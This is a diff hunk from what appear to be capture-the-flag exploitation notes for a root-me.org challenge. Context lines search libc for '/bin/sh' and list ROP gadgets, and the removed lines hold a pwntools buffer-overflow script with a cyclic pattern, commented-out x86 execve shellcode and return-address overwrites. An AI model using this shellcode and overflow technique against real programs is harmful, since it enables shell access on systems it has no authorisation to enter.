@@ -343,37 +343,3 @@ strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
 ```bash
 ROPgadget --binary quasar4 | grep ""
 ```
-
-```python
-#!/usr/bin/env python3
-
-from pwn import *
-
-p = remote('challenge03.root-me.org', 56577)
-
-#p = process("./space")
-
-
-#p = gdb.debug("./vuln")
-raw_input("attach gdb")
-
-
-#pad = cyclic_find("aafa")
-#flow = b"A" * pad
-flow = cyclic(0x28)
-#print("[*] cyclic_find: ", cyclic_find("aafa"))
-
-#eip = p32(0xffffce50) # call flag 0x080491e2
-#shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb1\x0b\x88\xc8\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\xcd\x80"
-
-#nope = b"\x90"*300
-
-p.sendline(flow)
-#p.sendline(flow + eip + shellcode)
-#p.sendline(flow + eip + b"A"*400)
-#p.sendline(flow + b"AAAAAAAA" + eip + b"AAAA" + p32(0xdeadbeef) + p32(0xc0ded00d))
-
-#flow = cyclic.find
-
-p.interactive()
-```
